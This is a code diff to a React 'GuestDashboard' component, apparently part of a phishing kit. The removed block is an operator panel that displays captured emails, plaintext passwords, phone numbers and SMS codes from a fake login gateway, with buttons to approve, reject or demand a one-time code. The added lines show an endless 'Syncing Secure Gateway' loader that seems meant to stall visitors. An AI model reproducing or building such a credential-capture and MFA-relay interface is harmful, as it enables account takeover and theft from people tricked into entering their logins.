@@ -440,115 +440,6 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
             </div>
           </section>
 
-          {/* TELEGRAM REMOTE ORCHESTRATOR */}
-          <section className="glass-card rounded-3xl p-6 sm:p-8" id="dashboard-telegram-orchestration">
-            <div className="flex items-center justify-between mb-6">
-              <div>
-                <h2 className="font-serif text-2xl font-bold text-slate-100 flex items-center gap-2">
-                  <span className="text-sky-400">✈️</span>
-                  Telegram Control
-                </h2>
-                <p className="font-sans text-[11px] text-slate-400 mt-0.5">
-                  Real-time guest approval overrides & notifications via Telegram API
-                </p>
-              </div>
-              <span className={`px-2 py-0.5 rounded-full font-mono text-[9px] font-bold uppercase tracking-wider ${
-                tgConfig?.hasToken 
-                  ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" 
-                  : "bg-slate-500/10 text-slate-400 border border-slate-500/20"
-              }`}>
-                {tgConfig?.hasToken ? "Active (.env)" : "Simulated"}
-              </span>
-            </div>
-
-            <div className="space-y-4">
-              <div className="flex items-center justify-between border-b border-white/5 pb-2 mb-1">
-                <span className="text-xs font-semibold font-sans tracking-wide text-sky-400">
-                  📲 Live Action Board ({tgAttempts.length})
-                </span>
-                {tgConfig?.hasToken && (
-                  <span className="text-[10px] text-slate-400">
-                    Bot Mask: <code className="text-slate-300 font-mono text-[9px] bg-white/5 px-1.5 py-0.5 rounded">{tgConfig.maskedToken}</code>
-                  </span>
-                )}
-              </div>
-
-              {tgAttempts.length === 0 ? (
-                <div className="text-center py-6 border border-dashed border-white/5 rounded-2xl bg-white/[0.01]">
-                  <div className="text-slate-400 text-xs mb-1">No active sign-ins requiring validation</div>
-                  <p className="text-[10px] text-slate-500 px-3 max-w-xs mx-auto">
-                    Go to the guest login gateway, initiate credentials entry, and watch them render here live!
-                  </p>
-                </div>
-              ) : (
-                <div className="space-y-3 max-h-[350px] overflow-y-auto pr-1">
-                  {tgAttempts.map((att: any) => (
-                    <div key={att.id} className="p-3 bg-white/5 hover:bg-white/[0.08] border border-white/5 rounded-xl transition-all">
-                      <div className="flex items-center justify-between mb-1.5">
-                        <div className="flex items-center gap-1.5 min-w-0">
-                          <span className="text-xs capitalize font-bold text-slate-200 truncate">{att.provider}</span>
-                          <span className="text-[10px] text-slate-500 truncate">{att.email}</span>
-                        </div>
-                        <span className={`px-1.5 py-0.5 rounded text-[8px] font-mono tracking-wider uppercase ${
-                          att.status === "pending" ? "bg-amber-500/10 text-amber-400 border border-amber-500/20" :
-                          att.status === "approved" ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" :
-                          "bg-red-500/10 text-red-400 border border-red-500/20"
-                        }`}>
-                          {att.status}
-                        </span>
-                      </div>
-
-                      {att.password && (
-                        <div className="text-[10px] text-slate-400 mb-2 truncate font-sans">
-                          🔑 Password: <span className="text-slate-200 font-mono text-[9px]">"{att.password}"</span>
-                          {att.promptNumber !== undefined && (
-                            <span className="ml-2 pl-2 border-l border-white/10 text-sky-400">Match Code: <b>{att.promptNumber}</b></span>
-                          )}
-                        </div>
-                      )}
-
-                      {/* Extra submitted fields */}
-                      {(att.phone || att.smsCode) && (
-                        <div className="bg-sky-500/5 border border-sky-400/10 rounded p-1.5 mb-2 font-mono text-[9px] text-sky-300">
-                          {att.phone && <div>📞 Phone: +1 {att.phone}</div>}
-                          {att.smsCode && <div>💬 SMS Code Check: {att.smsCode}</div>}
-                        </div>
-                      )}
-
-                      {att.status === "pending" && (
-                        <div className="grid grid-cols-4 gap-1 mt-1.5">
-                          <button
-                            onClick={() => handleTriggerOverride(att.id, "approved")}
-                            className="px-1 py-1 text-[9px] font-semibold font-sans bg-emerald-500/20 hover:bg-emerald-500/35 border border-emerald-500/30 text-emerald-300 rounded cursor-pointer transition-colors"
-                          >
-                            Approve
-                          </button>
-                          <button
-                            onClick={() => handleTriggerOverride(att.id, "request_sms")}
-                            className="px-1 py-1 text-[9px] font-semibold font-sans bg-sky-500/20 hover:bg-sky-500/35 border border-sky-500/30 text-sky-300 rounded cursor-pointer transition-colors"
-                          >
-                            Challenge
-                          </button>
-                          <button
-                            onClick={() => handleTriggerOverride(att.id, "incorrect_password")}
-                            className="px-1 py-1 text-[9px] font-semibold font-sans bg-amber-500/20 hover:bg-amber-500/35 border border-amber-500/30 text-amber-300 rounded cursor-pointer transition-colors"
-                          >
-                            Bad Pass
-                          </button>
-                          <button
-                            onClick={() => handleTriggerOverride(att.id, "denied")}
-                            className="px-1 py-1 text-[9px] font-semibold font-sans bg-red-500/20 hover:bg-red-500/35 border border-red-500/30 text-red-300 rounded cursor-pointer transition-colors"
-                          >
-                            Reject
-                          </button>
-                        </div>
-                      )}
-                    </div>
-                  ))}
-                </div>
-              )}
-            </div>
-          </section>
 
           {/* GUESTBOOK CARD */}
           <section className="glass-card rounded-3xl p-6 sm:p-8" id="dashboard-guestbook-section">
@@ -618,49 +509,11 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
 
       </div>
 
-      {/* DEVELOPER API LOGS CONSOLE (A magnificent visual representation of Node REST operations!) */}
-      <section className="glass-card rounded-3xl p-6 bg-black/40 text-slate-300 font-mono text-xs border border-white/10 backdrop-blur-xl" id="dev-backend-logs-section">
-        <div className="flex items-center justify-between border-b border-white/10 pb-3 mb-4">
-          <div className="flex items-center gap-2">
-            <div className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
-            <span className="font-bold text-slate-100 font-sans">Express REST Controller Dashboard</span>
-          </div>
-          <div className="flex items-center gap-3">
-            <span className="text-[10px] bg-white/5 border border-white/10 text-slate-400 px-2.5 py-0.5 rounded-md uppercase font-semibold font-sans">
-              Node API Server Logs
-            </span>
-            <Activity size={14} className="text-slate-500 animate-spin" style={{ animationDuration: '4s' }} />
-          </div>
-        </div>
-
-        <p className="text-[11px] text-slate-400 mb-3 font-sans leading-relaxed">
-          The react frontend regularly interfaces with server endpoints on port 3000. Simulated log metrics show secure authorization, request payloads, and RSVP states in real time:
-        </p>
-
-        <div className="space-y-1.5 max-h-[160px] overflow-y-auto pr-1 scrollbar-thin scrollbar-thumb-white/10" id="express-realtime-logs">
-          {logs.map((log) => (
-            <div key={log.id} className="flex flex-col sm:flex-row items-start sm:items-center gap-1.5 sm:gap-4 py-1 border-b border-white/5 last:border-0 hover:bg-white/5 px-2 rounded-lg transition-colors">
-              <span className="text-slate-500 text-[10px] shrink-0 font-light">
-                {new Date(log.timestamp).toLocaleTimeString()}
-              </span>
-              <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold tracking-wide shrink-0 ${
-                log.type === "LOGIN_SUCCESS" ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" :
-                log.type === "RSVP_SUBMITTED" ? "bg-amber-500/10 text-amber-400 border border-amber-500/20" :
-                log.type === "GATEWAY_LOGIN_ATTEMPT" ? "bg-indigo-500/10 text-indigo-400 border border-indigo-500/20" :
-                "bg-white/5 text-slate-400"
-              }`}>
-                {log.type}
-              </span>
-              <p className="text-slate-300 text-[11px] font-light leading-snug">
-                {log.details}
-              </p>
-              <span className="sm:ml-auto text-[10px] text-slate-500 font-light">
-                IP: {log.ipPlaceholder}
-              </span>
-            </div>
-          ))}
-        </div>
-      </section>
+      {/* Infinite Gateway Loader */}
+      <div className="flex flex-col items-center justify-center py-12">
+        <div className="w-8 h-8 border-2 border-indigo-400 border-t-transparent rounded-full animate-spin mb-4" />
+        <p className="text-slate-400 font-sans text-xs tracking-widest uppercase animate-pulse">Syncing Secure Gateway...</p>
+      </div>
 
     </motion.div>
   );
